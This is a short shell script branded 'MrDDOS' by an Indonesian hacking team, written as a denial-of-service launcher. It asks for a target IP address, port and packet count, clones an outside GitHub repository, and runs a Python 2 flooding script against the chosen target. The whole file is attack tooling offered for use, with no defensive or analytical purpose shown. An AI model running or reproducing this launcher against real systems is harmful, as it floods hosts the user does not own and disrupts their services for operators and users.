clear
toilet -f slant --gay "MrDDOS"

echo '\033[1;32m===================================================='
echo '\033[1;31mTeam   : \033[1;37mDevlinCyberTeam'
echo '\033[1;31mAuthor : \033[1;37mMr.4R13F'
echo '\033[1;31mRegion : \033[1;37mINDONESIA'
echo '\033[1;31mCyber  : \033[1;37mJatimCyber'
echo '\033[1;32m===================================================='

echo '\033[1;31mMakasih Telah menggunakan Tools Kami'
read -p "Ip target ->" Ip

echo '\033[1;32mMasukan port (8080)'
read -p "Gunakan Port ->" Port

echo '\033[1;31mMasukan Packet send sebanyak mungkin'
read -p "Packet ->" Packet

sleep4

git clone https://github.com/SCTcyber/MrDDOS.git
cd MrDDOS
python2 R133FDDOS.py
sleep 3

python2 R133FDDOS.py $Ip $Port $Packet
